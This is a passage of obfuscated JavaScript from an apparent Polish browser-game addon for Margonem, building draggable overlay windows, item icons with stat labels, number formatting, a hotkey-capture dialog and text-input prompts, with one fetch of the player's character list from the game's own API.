    const _0x150b51 = _0x275c30.window[_0x19f699].s;
    _0x275c30.window[_0x19f699].s = !_0x150b51;
    _0x4bc74f.draggable(_0x150b51 ? "enable" : "disable");
    _0x153354.tip(_0x150b51 ? "Zablokuj okno" : "Odblokuj okno").toggleClass("mp-window-unpin-button", _0x150b51).toggleClass("mp-window-pin-button", !_0x150b51);
    saveStorage(_0x231296, _0x275c30);
  });
  if (_0x16e6ab) {
    const _0x425032 = $("<div class=\"mp-window-search-" + (_0x275c30.window[_0x19f699].search ? "off" : "on") + "-button do-action-cursor\"></div>").appendTo(_0x3126cf).on("click", async () => {
      const _0x2ed44f = !_0x275c30.window[_0x19f699].search;
      _0x275c30.window[_0x19f699].search = _0x2ed44f;
      _0x46f40c.toggle(_0x2ed44f);
      _0x425032.tip(_0x2ed44f ? "Ukryj wyszukiwanie" : "Pokaż wyszukiwanie").removeClass("mp-window-search-off-button mp-window-search-on-button").addClass(_0x2ed44f ? "mp-window-search-off-button" : "mp-window-search-on-button");
      saveStorage(_0x231296, _0x275c30);
    }).tip(_0x275c30.window[_0x19f699].search ? "Ukryj wyszukiwanie" : "Pokaż wyszukiwanie");
    const _0x4e780c = $("<div class=\"mp-window-list-" + (!_0x275c30.window[_0x19f699].list ? "right" : "left") + "-button do-action-cursor\"></div>").appendTo(_0xaec14c).on("click", async () => {
      const _0x7a1b6a = !_0x275c30.window[_0x19f699].list;
      _0x275c30.window[_0x19f699].list = _0x7a1b6a;
      _0x2e9df3.toggle(_0x7a1b6a);
      _0x4e780c.tip(_0x7a1b6a ? "Nie wyświetlaj osób na spotach" : "Wyświetlaj osoby na spotach").removeClass("mp-window-list-left-button mp-window-list-right-button").addClass(_0x7a1b6a ? "mp-window-list-left-button" : "mp-window-list-right-button");
      saveStorage(_0x231296, _0x275c30);
    }).tip(!_0x275c30.window[_0x19f699].list ? "Wyświetlaj osoby na spotach" : "Nie wyświetlaj osób na spotach");
  }
  const _0xef3794 = _0x275c30.window[_0x19f699].m;
  const _0x4b2d9c = $("\n        <div id=\"collapse\" class=\"do-action-cursor mp-window-collapse-button-" + (_0xef3794 ? "up" : "down") + "\"></div>\n    ").tip(_0x275c30.window[_0x19f699].m ? "Rozwiń" : "Zwiń");
  _0x4b2d9c.on("click", async function () {
    const _0x175cef = !_0x275c30.window[_0x19f699].m;
    _0x275c30.window[_0x19f699].m = _0x175cef;
    _0x4bc74f.find(".content").toggle(!_0x175cef);
    _0x4bc74f.find(".mp-resize").toggle(!_0x175cef);
    if (_0x16e6ab) {
      if (!_0x275c30.window[_0x19f699].m) {
        const _0x41dda6 = {
          width: _0x275c30.window[_0x19f699].size.w + "px",
          minHeight: "12px"
        };
        _0x2e9df3.css(_0x41dda6);
      } else {
        _0x2e9df3.css({
          width: "200px",
          minHeight: "unset"
        });
      }
    }
    $(this).tip(_0x175cef ? "Rozwiń" : "Zwiń").removeClass("mp-window-collapse-button-up mp-window-collapse-button-down").addClass(_0x175cef ? "mp-window-collapse-button-up" : "mp-window-collapse-button-down");
    saveStorage(_0x231296, _0x275c30);
  });
  _0x4b2d9c.appendTo(_0x3126cf);
  $("<div class=\"mp-window-close-button do-action-cursor\"></div>").appendTo(_0x3126cf).on("click", async () => {
    _0x4bc74f.hide();
    _0x275c30.window[_0x19f699].o = false;
    $("div[mp-widget-ui=\"" + _0x19f699 + "\"] div").removeClass("mp-icon-active");
    if (_0x12f125) {
      if (_0x19f699.includes("add57_stash_")) {
        const _0x2b2d7b = _0x19f699.replace("add57_stash_", "");
        _0x275c30.settings.add57[_0x2b2d7b] = false;
        $("div[data-stash=\"" + _0x2b2d7b + "\"]").removeClass("mp-btn-active");
      }
    }
    if (_0x417949) {
      $("#addon-widget-btn").removeClass("mp-button-red");
      $("#addon-widget-btn").removeClass("mp-button-green");
      $("#addon-widget-btn").addClass(_0x275c30.window.addwidget.o ? "mp-button-red" : "mp-button-green");
      $("#addon-widget-btn").html(_0x275c30.window.addwidget.o ? "Ukryj skróty" : "Pokaż skróty");
    }
    saveStorage(_0x231296, _0x275c30);
  }).tip("Zamknij");
  if (_0x275c30.window[_0x19f699].s) {
    _0x4bc74f.draggable("disable");
  }
  $("<div data-drag=\"" + _0x19f699 + "\" class=\"mp-resize\"><span class=\"mp-icon icon-resize do-action-cursor\"></span></div>").appendTo(_0x4bc74f).mousedown(function () {
    _0x147915 = true;
  }).appendTo(_0x4bc74f);
  if (_0x275c30.window[_0x19f699].m) {
    _0x4bc74f.find(".content").hide();
    _0x4bc74f.find(".mp-resize").hide();
  }
  document.addEventListener("mousemove", async function (_0x2267a6) {
    if (_0x147915 && !_0x275c30.window[_0x19f699].m && !_0x275c30.window[_0x19f699].s) {
      const _0x57c905 = _0x516d6c.offset();
      let _0x1eab11 = _0x2267a6.clientX - _0x57c905.left;
      let _0x592f9b = _0x2267a6.clientY - _0x57c905.top;
      if (_0x12f125) {
        let _0x48b3e5 = Math.floor(_0x1eab11 / 32);
        _0x1eab11 = _0x48b3e5 * 32;
        let _0x45dcac = Math.floor(_0x592f9b / 32);
        _0x592f9b = _0x45dcac * 32;
        _0x1eab11 = _0x1eab11 >= 192 ? _0x1eab11 : 192;
        _0x592f9b = _0x592f9b >= 32 ? _0x592f9b : 32;
      } else if (_0x417949) {
        let _0xc94571 = Math.floor(_0x1eab11 / 34);
        _0x1eab11 = _0xc94571 * 34;
        let _0x10a472 = Math.floor(_0x592f9b / 34);
        _0x592f9b = _0x10a472 * 34;
        _0x1eab11 = _0x1eab11 >= 34 ? _0x1eab11 : 34;
        _0x592f9b = _0x592f9b >= 34 ? _0x592f9b : 34;
      } else {
        _0x1eab11 = _0x1eab11 >= 190 ? _0x1eab11 : 190;
        _0x592f9b = _0x592f9b >= 34 ? _0x592f9b : 34;
      }
      _0x516d6c.height(_0x592f9b);
      _0x516d6c.width(_0x1eab11);
      _0x2e9df3.width(_0x1eab11);
      _0x275c30.window[_0x19f699].size.w = _0x1eab11;
      _0x275c30.window[_0x19f699].size.h = _0x592f9b;
      saveStorage(_0x231296, _0x275c30);
    }
  });
  document.addEventListener("mouseup", function (_0x3adf24) {
    _0x147915 = false;
  });
  if (_0x417949) {
    _0x4bc74f.find(".mp-resize").hide();
  }
  if (_0x275c30.window[_0x19f699].p.x + _0x275c30.window[_0x19f699].p.y === -2) {
    _0x4bc74f.addClass("mp-centered");
  }
  return _0x4bc74f;
}
export function enableScroll(_0x323d8c) {
  (function (_0x438d89) {
    if (window.InstallTrigger) {
      return;
    }
    const _0x263f78 = _0x438d89.fn.is;
    _0x438d89.fn.is = function (_0x4eace6) {
      const _0x4c5bc0 = _0x438d89(this);
      const _0x3167ef = _0x323d8c;
      if (_0x4eace6 === "textarea" && (_0x4c5bc0.hasClass(_0x3167ef) || _0x4c5bc0.parents("." + _0x3167ef).length)) {
        return true;
      }
      return _0x263f78.call(this, _0x4eace6);
    };
  })($);
}
export async function setInstalledAddon(_0x17882e, _0x1798a2, _0x4ab4a2, _0x477aab) {
  _0x477aab.addons[_0x17882e] = _0x1798a2;
  saveStorage(_0x4ab4a2, _0x477aab);
}
export function readStats(_0x1a0b45) {
  var _0x1a0b45 = _0x1a0b45.split(";");
  var _0xb048eb = {};
  for (var _0xde8f4b = 0; _0xde8f4b < _0x1a0b45.length; _0xde8f4b++) {
    var _0x2373b4 = _0x1a0b45[_0xde8f4b].split("=");
    _0xb048eb[_0x2373b4[0]] = isset(_0x2373b4[1]) ? _0x2373b4[1] : null;
  }
  return _0xb048eb;
}
export function unreadStats(_0x23f6be) {
  let _0x27f59e = [];
  for (const _0x31e79d in _0x23f6be) {
    if (Object.hasOwnProperty.call(_0x23f6be, _0x31e79d)) {
      const _0x2ef0ef = _0x23f6be[_0x31e79d];
      if (_0x2ef0ef !== null && _0x2ef0ef !== undefined) {
        _0x27f59e.push(_0x31e79d + "=" + _0x2ef0ef);
      } else {
        _0x27f59e.push(_0x31e79d);
      }
    }
  }
  return _0x27f59e.join(";");
}
export function showProfile(_0x26545a, _0x340e00) {
  const _0x17ee1e = {
    accountId: _0x26545a,
    characterId: _0x340e00
  };
  Engine.iframeWindowManager.newPlayerProfile(_0x17ee1e);
}
export function parsedNumber(_0x51c9ea) {
  var _0x2c5ee3 = _0x51c9ea.toString().length > 9 ? 12 : 10;
  var _0x39ffb4 = _0x51c9ea.toString().length > 9 ? "." : " ";
  return round(_0x51c9ea, _0x2c5ee3, _0x39ffb4, 3);
}
export function parseMoney(_0x1995c7) {
  const _0x1b33b3 = {
    million: 1000000,
    thousand: 1000
  };
  const _0x246ff1 = {
    million: "m",
    thousand: "k"
  };
  let _0x200b47;
  if (_0x1995c7 >= _0x1b33b3.million) {
    _0x200b47 = (_0x1995c7 / _0x1b33b3.million).toFixed(1) + _0x246ff1.million;
  } else if (_0x1995c7 >= _0x1b33b3.thousand) {
    _0x200b47 = (_0x1995c7 / _0x1b33b3.thousand).toFixed(1) + _0x246ff1.thousand;
  } else {
    _0x200b47 = _0x1995c7.toString();
  }
  return _0x200b47.replace(".0", "");
}
export function universalCreateItem(_0x6d9d01, _0x3d5f67, _0x90e103) {
  const _0x101a81 = {
    common: "t-norm",
    unique: "t-uniupg",
    heroic: "t-her",
    upgraded: "t-upgraded",
    legendary: "t-leg",
    artefact: "t-art"
  };
  let _0x262713 = $("<div class='item mp-id-" + _0x6d9d01.id + " do-action-cursor' data-name='" + _0x6d9d01.name + "' style=\"position: relative !important; width: 32px; height: 32px;\"></div>");
  $("<div class=\"highlight " + _0x101a81[_0x6d9d01.rarity || _0x6d9d01.type] + " h-exist\"></div>").appendTo(_0x262713);
  const _0x7e573 = _0x6d9d01.icon.includes("http") ? _0x6d9d01.icon : "https://micc.garmory-cdn.cloud/obrazki/itemy/" + _0x6d9d01.icon;
  $("<img width=\"32\" height=\"32\" src=\"" + _0x7e573 + "\" style=\"z-index: 999 !important; position: absolute; left: 0px; bottom: 0px;\"></img>").appendTo(_0x262713);
  $("<canvas class=\"canvas-notice\" width=\"32\" height=\"32\"></canvas>").appendTo(_0x262713);
  const _0x1959b2 = readStats(_0x6d9d01.stat);
  const {
    lvl: _0x5905d8,
    enhancement_upgrade_lvl: _0x47bbb6,
    legbon: _0x9ab52,
    legbon_test: _0x1070da,
    socket_injection_legbon: _0x445050,
    socket_fleeting_legbon: _0x52ec0a,
    amount: _0x549701,
    target_min_lvl: _0x41ed29,
    target_max_lvl: _0x5ab7ce,
    fullheal: _0x40fdac,
    perheal: _0x3cc21f,
    leczy: _0x5428a9,
    lootbox2: _0x56e9a7,
    opis: _0x32e921
  } = _0x1959b2;
  if (_0x549701) {
    $("<div class=\"amount\" style=\"z-index: 999 !important; font-size: 9px !important;\">" + formatNumber(_0x549701) + "</div>").appendTo(_0x262713);
  }
  const _0x5ae758 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29];
  if (_0x5ae758.indexOf(_0x6d9d01.cl) >= 0 && _0x5905d8) {
    $("<div class=\"mp-basic-label mp-label-level\">" + _0x5905d8 + "</div>").appendTo(_0x262713);
  }
  if (_0x47bbb6 >= 0) {
    $("<div class=\"mp-basic-label mp-label-upgrade-level\">" + _0x47bbb6 + "</div>").appendTo(_0x262713);
  }
  let _0x69c026 = _0x5428a9 ?? _0x3cc21f ?? _0x40fdac;
  if (_0x69c026 && Number(_0x69c026) > 0 && _0x6d9d01.cl == 16) {
    $("<div class=\"mp-label-healing\"></div>").appendTo(_0x262713);
  }
  if ([28, 26].indexOf(_0x6d9d01.cl) >= 0 && _0x41ed29) {
    const _0x3d8ac1 = {
      "20": "T1",
      "101": "T2",
      "201": "T3"
    };
    $("<div class=\"mp-basic-label mp-label-comp\">" + _0x3d8ac1[_0x41ed29] + "</div>").appendTo(_0x262713);
  }
  if (_0x6d9d01.cl == 16 && _0x56e9a7 && _0x32e921) {
    let _0x449868 = false;
    if (_0x32e921?.includes("20-100")) {
      _0x449868 = "T1";
    }
    if (_0x32e921?.includes("101-200")) {
      _0x449868 = "T2";
    }
    if (_0x32e921?.includes(" 201-300")) {
      _0x449868 = "T3";
    }
    if (_0x449868) {
      $("<div class=\"mp-basic-label mp-label-comp\">" + _0x449868 + "</div>").appendTo(_0x262713);
    }
  }
  let _0x235b92 = _0x52ec0a ?? _0x445050 ?? _0x1070da ?? _0x9ab52;
  if (_0x235b92) {
    const _0x379463 = String(_0x235b92).split(",")[0];
    const _0x26f7c3 = {
      cleanse: "PO",
      facade: "FO",
      anguish: "KU",
      puncture: "PS",
      frenzy: "ES",
      retaliation: "AO",
      curse: "KL",
      glare: "OS",
      critred: "KO",
      holytouch: "DA",
      verycrit: "CK",
      lastheal: "OR"
    };
    $("<div class=\"mp-basic-label mp-label-legbon\">" + _0x26f7c3[_0x379463] + "</div>").appendTo(_0x262713);
  }
  const _0x4f092c = {
    npc_lootbon: "LOOT",
    quest_expbon: "QUE",
    npc_expbon: "EXP",
    honorbon: "PH"
  };
  if (_0x6d9d01.cl == 25) {
    for (const _0x5cf2d2 in _0x4f092c) {
      if (_0x1959b2[_0x5cf2d2]) {
        $("<div class=\"mp-basic-label mp-label-bless\">" + _0x4f092c[_0x5cf2d2] + "</div>").appendTo(_0x262713);
        break;
      }
    }
  }
  const _0x135f0f = {
    fire: "fire",
    frost: "frost",
    wound: "wound",
    light: "light",
    poison: "poison"
  };
  for (const _0x1c1d69 in _0x135f0f) {
    if (_0x1959b2[_0x1c1d69]) {
      $("<div class=\"mp-label-damage mp-damage-" + _0x135f0f[_0x1c1d69] + "\"></div>").appendTo(_0x262713);
      break;
    }
  }
  const _0x282a45 = $(MargoTipsParser.getTip(_0x6d9d01));
  const _0x5b29da = $(_0x262713).clone();
  _0x5b29da.prependTo(_0x282a45[0]);
  $(_0x262713).tip(_0x282a45);
  $(_0x262713).attr("data-tip-type", "t_item");
  $(_0x262713).attr("data-item-type", _0x101a81[_0x6d9d01.rarity || _0x6d9d01.type]);
  return _0x262713;
}
export function formatNumber(_0x11e89c) {
  if (_0x11e89c >= 1000000) {
    let _0x518c4f = _0x11e89c / 1000000;
    if (_0x518c4f - Math.floor(_0x518c4f) < 0.051) {
      return Math.floor(_0x518c4f) + "m";
    }
    return _0x518c4f.toFixed(1) + "m";
  } else if (_0x11e89c >= 10000) {
    let _0x217479 = _0x11e89c / 1000;
    if (_0x217479 - Math.floor(_0x217479) < 0.051) {
      return Math.floor(_0x217479) + "k";
    }
    return _0x217479.toFixed(1) + "k";
  }
  return _0x11e89c.toString();
}
export function ShowNumber(_0x5e3604) {
  return String(_0x5e3604).replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}
export async function fetchCharacterList() {
  try {
    const _0x15cb64 = await fetch("https://public-api.margonem.pl/account/charlist?hs3=" + getCookie("hs3"), {
      method: "GET",
      credentials: "include"
    });
    if (!_0x15cb64.ok) {
      throw new Error("HTTP error! Status: " + _0x15cb64.status);
    }
    let _0x4a8527 = await _0x15cb64.json();
    return _0x4a8527;
  } catch (_0x3813d9) {
    console.error("There was a problem with the fetch operation:", _0x3813d9);
  }
}
export function createButton(_0x5b4d9b, _0x464ed8) {
  let _0x49474a = "";
  if (_0x464ed8) {
    _0x49474a = " mp-button-" + _0x464ed8;
  }
  const _0x75df4d = $("<div class=\"mp-button do-action-cursor" + _0x49474a + "\">" + _0x5b4d9b + "</div>");
  return _0x75df4d;
}
export function createButtonHotkeys() {
  const _0x261080 = $("<div class=\"mp-button do-action-cursor\"><div class=\"mp-icon-hotkeys\"></div></div>");
  _0x261080.tip("Edytuj skrót klawiszowy");
  return _0x261080;
}
export function formatKey(_0x37a28b) {
  const _0x304586 = [];
  if (_0x37a28b.ctrlKey) {
    _0x304586.push("Ctrl");
  }
  if (_0x37a28b.shiftKey) {
    _0x304586.push("Shift");
  }
  if (_0x37a28b.altKey) {
    _0x304586.push("Alt");
  }
  if (["Control", "Shift", "Alt", "Meta"].includes(_0x37a28b.key)) {
    return null;
  }
  let _0x3beb86 = _0x37a28b.code;
  if (_0x3beb86.startsWith("Key")) {
    _0x3beb86 = _0x3beb86.replace("Key", "");
  } else if (_0x3beb86.startsWith("Digit")) {
    _0x3beb86 = _0x3beb86.replace("Digit", "");
  }
  _0x304586.push(_0x3beb86);
  return _0x304586.join(" + ");
}
export async function showKeyCaptureWindow(_0x5deec0 = false) {
  return new Promise(_0x404f7f => {
    const _0x1d4772 = $("#mp-overlay-hotkeys");
    if (_0x1d4772.length > 0) {
      _0x1d4772.remove();
      document.removeEventListener("keydown", window._mpKeyHandler);
    }
    const _0x3184e3 = $("\n        <div id=\"mp-overlay-hotkeys\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer skrótów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                " + (_0x5deec0 ? "<div class=\"mp-current-char\">" + _0x5deec0 + "</div><br>" : "") + "\n                <div class=\"mp-give-char\">Wciśnij nowy klawisz</div><br>\n                <div id=\"noneBtn\" class=\"mp-button mp-button-red do-action-cursor\">Usuń skrót</div>\n            </div>\n        </div>\n    ");
    function _0x56b4fe() {
      document.removeEventListener("keydown", window._mpKeyHandler);
      _0x3184e3.remove();
      delete window._mpKeyHandler;
    }
    function _0xb0deb8(_0x2d0fd3) {
      const _0x5a0f4d = [];
      if (_0x2d0fd3.ctrlKey) {
        _0x5a0f4d.push("Ctrl");
      }
      if (_0x2d0fd3.shiftKey) {
        _0x5a0f4d.push("Shift");
      }
      if (_0x2d0fd3.altKey) {
        _0x5a0f4d.push("Alt");
      }
      if (["Control", "Shift", "Alt", "Meta"].includes(_0x2d0fd3.key)) {
        return null;
      }
      let _0x2c55e8 = _0x2d0fd3.code;
      if (_0x2c55e8.startsWith("Key")) {
        _0x2c55e8 = _0x2c55e8.replace("Key", "");
      } else if (_0x2c55e8.startsWith("Digit")) {
        _0x2c55e8 = _0x2c55e8.replace("Digit", "");
      }
      _0x5a0f4d.push(_0x2c55e8);
      return _0x5a0f4d.join(" + ");
    }
    function _0x5760b5(_0x297dfa) {
      _0x297dfa.preventDefault();
      if (_0x297dfa.key === "Escape") {
        _0x56b4fe();
        _0x404f7f(null);
        return;
      }
      const _0x5eacd3 = _0xb0deb8(_0x297dfa);
      const _0x5fe5f6 = $("#mp-overlay-hotkeys .mp-give-char");
      if (_0x5fe5f6.length) {
        if (_0x5eacd3) {
          _0x5fe5f6.text("Wybrano: " + _0x5eacd3);
        } else {
          const _0x1d984d = [];
          if (_0x297dfa.ctrlKey) {
            _0x1d984d.push("Ctrl");
          }
          if (_0x297dfa.shiftKey) {
            _0x1d984d.push("Shift");
          }
          if (_0x297dfa.altKey) {
            _0x1d984d.push("Alt");
          }
          _0x5fe5f6.text("Wciśnięto: " + (_0x1d984d.join(" + ") || "..."));
        }
      }
      if (!_0x5eacd3) {
        return;
      }
      _0x56b4fe();
      _0x404f7f(_0x5eacd3);
    }
    window._mpKeyHandler = _0x5760b5;
    document.addEventListener("keydown", _0x5760b5);
    _0x3184e3.find("#noneBtn").click(() => {
      _0x56b4fe();
      _0x404f7f("Brak");
    });
    _0x3184e3.find("#closeBtn").click(() => {
      _0x56b4fe();
      _0x404f7f(null);
    });
    _0x3184e3.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0xa046e1, _0x341e54) => {}
    });
    const _0x5bbc40 = _0x3184e3.outerWidth();
    const _0x52b7c4 = _0x3184e3.outerHeight();
    const _0xaf344b = (window.innerWidth - _0x5bbc40) / 2;
    const _0xa2b1e0 = (window.innerHeight - _0x52b7c4) / 2;
    const _0x949e7e = {
      zIndex: 999,
      position: "absolute",
      left: _0xaf344b + "px",
      top: _0xa2b1e0 + "px"
    };
    _0x3184e3.css(_0x949e7e);
  });
}
export async function addClanText(_0x5205ec = false) {
  return new Promise(_0x41399a => {
    const _0x272ee5 = $("#mp-overlay-url-clan");
    if (_0x272ee5.length > 0) {
      _0x272ee5.remove();
    }
    const _0x57ae15 = $("\n        <div id=\"mp-overlay-url-clan\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer tekstu</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź wiadomość (dostępne zmienne: {item})</div>\n                    <input id=\"mp-input-url-clan\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Zlotałem {item}! Super!\" style=\"width: 350px;\"" + (_0x5205ec ? "value=\"" + _0x5205ec + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x57ae15.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x35f501() {
      _0x57ae15.remove();
    }
    _0x57ae15.find("#saveBtn").click(() => {
      const _0x49939b = _0x57ae15.find("#mp-input-url-clan").val();
      _0x35f501();
      _0x41399a(_0x49939b);
    });
    _0x57ae15.find("#closeBtn").click(() => {
      _0x35f501();
      _0x41399a(null);
    });
    const _0x45a6ec = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x4f567e, _0x4fbf8a) => {}
    };
    _0x57ae15.appendTo("#mp-root").draggable(_0x45a6ec);
    const _0x1dae73 = _0x57ae15.outerWidth();
    const _0x19ae06 = _0x57ae15.outerHeight();
    const _0x36d24 = (window.innerWidth - _0x1dae73) / 2;
    const _0x20c401 = (window.innerHeight - _0x19ae06) / 2;
    const _0x1d3288 = {
      zIndex: 999,
      position: "absolute",
      left: _0x36d24 + "px",
      top: _0x20c401 + "px"
    };
    _0x57ae15.css(_0x1d3288);
  });
}
export async function addMetkaText() {
  return new Promise(_0x436123 => {
    const _0x446cef = $("#mp-overlay-label-text");
    if (_0x446cef.length > 0) {
      _0x446cef.remove();
    }
    const _0x453f0d = $("\n        <div id=\"mp-overlay-label-text\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer tekstu</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <input id=\"mp-input-label-text\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Max 6 znaków\" style=\"width: 350px;\" maxlength=\"6\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x453f0d.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x2980c1() {
      _0x453f0d.remove();
    }
    _0x453f0d.find("#saveBtn").click(() => {
      const _0x1ed1a6 = _0x453f0d.find("#mp-input-label-text").val();
      _0x2980c1();
      _0x436123(_0x1ed1a6);
    });
    _0x453f0d.find("#closeBtn").click(() => {
      _0x2980c1();
      _0x436123(null);
    });
    _0x453f0d.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x49e51e, _0x303dfb) => {}
    });
    const _0x26b3da = _0x453f0d.outerWidth();
    const _0x274313 = _0x453f0d.outerHeight();
    const _0x262e47 = (window.innerWidth - _0x26b3da) / 2;
    const _0x303f90 = (window.innerHeight - _0x274313) / 2;
    const _0x4dd0be = {
      zIndex: 999,
      position: "absolute",
      left: _0x262e47 + "px",
      top: _0x303f90 + "px"
    };
    _0x453f0d.css(_0x4dd0be);
  });
}
export async function askSplit() {
  return new Promise(_0xf528ff => {
    const _0x2a4c18 = $("#mp-overlay-split");
    if (_0x2a4c18.length > 0) {
      _0x2a4c18.remove();
    }
    const _0x5d73d3 = $("\n        <div id=\"mp-overlay-split\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Dzielenie przedmiotów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Po ile podzielić przedmioty?</div>\n                    <input id=\"mp-input-split\" type=\"number\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Ilość\" style=\"width: 50px;\"}>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Podziel</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x5d73d3.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x112daf() {
      _0x5d73d3.remove();
    }
    _0x5d73d3.find("#saveBtn").click(() => {
      const _0x422665 = _0x5d73d3.find("#mp-input-split").val();
      _0x112daf();
      if (Number(_0x422665) > 0) {
        _0xf528ff(_0x422665);
      } else {
        _0xf528ff(null);
      }
    });
    _0x5d73d3.find("#closeBtn").click(() => {
      _0x112daf();
      _0xf528ff(null);
    });
    _0x5d73d3.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x3dd7a0, _0x179fb2) => {}
    });
    const _0x2ecdd0 = _0x5d73d3.outerWidth();
    const _0x2fcbc6 = _0x5d73d3.outerHeight();
    const _0x33cf23 = (window.innerWidth - _0x2ecdd0) / 2;
    const _0x58938e = (window.innerHeight - _0x2fcbc6) / 2;
    const _0x4224ea = {
      zIndex: 999,
      position: "absolute",
      left: _0x33cf23 + "px",
      top: _0x58938e + "px"
    };
    _0x5d73d3.css(_0x4224ea);
  });
}
export async function addChatterText(_0x23457f = false) {
  return new Promise(_0x33d566 => {
    const _0x58e485 = $("#mp-overlay-chatter");
    if (_0x58e485.length > 0) {
      _0x58e485.remove();
    }
    const _0x1edb63 = $("\n        <div id=\"mp-overlay-chatter\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer kafelków</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wysyłana wiadomość</div>\n                    <input id=\"mp-input-chatter\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Wiadomość\" style=\"width: 350px;\"" + (_0x23457f ? "value=\"" + _0x23457f + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x1edb63.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x25aa39() {
      _0x1edb63.remove();
    }
    _0x1edb63.find("#saveBtn").click(() => {
      const _0x5e1160 = _0x1edb63.find("#mp-input-chatter").val();
      _0x25aa39();
      _0x33d566(_0x5e1160);
    });
    _0x1edb63.find("#closeBtn").click(() => {
      _0x25aa39();
      _0x33d566(null);
    });
    _0x1edb63.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x1fb22c, _0x2e015b) => {}
    });
    const _0x2d0388 = _0x1edb63.outerWidth();
    const _0x42c3a6 = _0x1edb63.outerHeight();
    const _0x195e93 = (window.innerWidth - _0x2d0388) / 2;
    const _0x5c6483 = (window.innerHeight - _0x42c3a6) / 2;
    const _0x229b84 = {
      zIndex: 999,
      position: "absolute",
      left: _0x195e93 + "px",
      top: _0x5c6483 + "px"
    };
    _0x1edb63.css(_0x229b84);
  });
}
export async function addDialogText(_0x20f5f6 = false) {
  return new Promise(_0xe958a0 => {
    const _0x142181 = $("#mp-overlay-dialog");
    if (_0x142181.length > 0) {
      _0x142181.remove();
    }
